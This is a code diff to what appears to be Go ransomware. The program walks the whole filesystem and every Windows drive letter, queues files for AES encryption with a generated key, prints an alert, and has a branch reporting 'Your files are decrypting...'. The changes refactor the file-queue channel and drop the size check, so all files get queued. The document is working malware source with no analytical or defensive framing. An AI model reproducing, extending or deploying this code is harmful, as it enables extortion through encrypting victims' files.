@@ -21,6 +21,7 @@ package main
 
 import (
 	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
@@ -30,19 +31,13 @@ import (
 	"net/http"
 	"os"
 	"runtime"
-	"crypto/cipher"
 )
 
 const procNum = 10
 
 var method byte
-var handleList chan string
 
-func init() {
-	handleList = make(chan string, 2048)
-}
-
-func do_cAll(path string) error {
+func do_cAll(path string, list chan string) error {
 
 	if filter(path) == 0 {
 		return nil
@@ -53,11 +48,12 @@ func do_cAll(path string) error {
 		return err
 	}
 
-	if !dir.IsDir() && dir.Size() >= 1024 {
-		if dir.Size() >= 1024 || (method == 'e' && filter(path) == 2) {
+	if !dir.IsDir() {
+		if method == 'e' && filter(path) == 2 {
 			return nil
 		}
-		handleList <- path
+		list <- path
+		return nil
 	}
 
 	fd, err := os.Open(path)
@@ -65,18 +61,18 @@ func do_cAll(path string) error {
 		return err
 	}
 
-	names, err1 := fd.Readdirnames(1000)
+	names, err1 := fd.Readdirnames(100)
 	if len(names) == 0 || err1 != nil {
 		return nil
 	}
 
 	for _, name := range names {
-		do_cAll(path + string(os.PathSeparator) + name)
+		do_cAll(path+string(os.PathSeparator)+name, list)
 	}
 	return nil
 }
 
-func cAll() {
+func cAll(list chan string) {
 
 	defer func() {
 		if method == 'e' {
@@ -85,21 +81,21 @@ func cAll() {
 	}()
 
 	if runtime.GOOS != "windows" {
-		do_cAll("/")
+		do_cAll("/", list)
 	}
 
 	DriverChan := make(chan bool, 26)
 	for i := 0; i < 26; i++ {
-		go func(path string, ExitChan chan bool) {
-			do_cAll(path)
+		go func(path string, list chan string, ExitChan chan bool) {
+			do_cAll(path, list)
 			ExitChan <- true
-		}(string('A'+i)+":\\", DriverChan)
+		}(string('A'+i)+":\\", list, DriverChan)
 	}
 	for i := 0; i < 26; i++ {
 		<-DriverChan
 	}
 
-	close(handleList)
+	close(list)
 
 	return
 }
@@ -130,6 +126,7 @@ func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 	fmt.Println(string(alert))
 	action := true
+	handleList := make(chan string, 2048)
 	bb, err := ioutil.ReadFile(dkeyFilename)
 	if err != nil {
 		action = false
@@ -141,12 +138,11 @@ func main() {
 		cip, _ = aes.NewCipher(b)
 		saveKey(b)
 		method = 'e'
-		go cAll()
 	} else {
 		cip, _ = aes.NewCipher(bb)
 		fmt.Println("Your files are decrypting...")
 		method = 'd'
 	}
-	go cAll()
-	startHandler(cip)
+	go cAll(handleList)
+	startHandler(cip, handleList)
 }
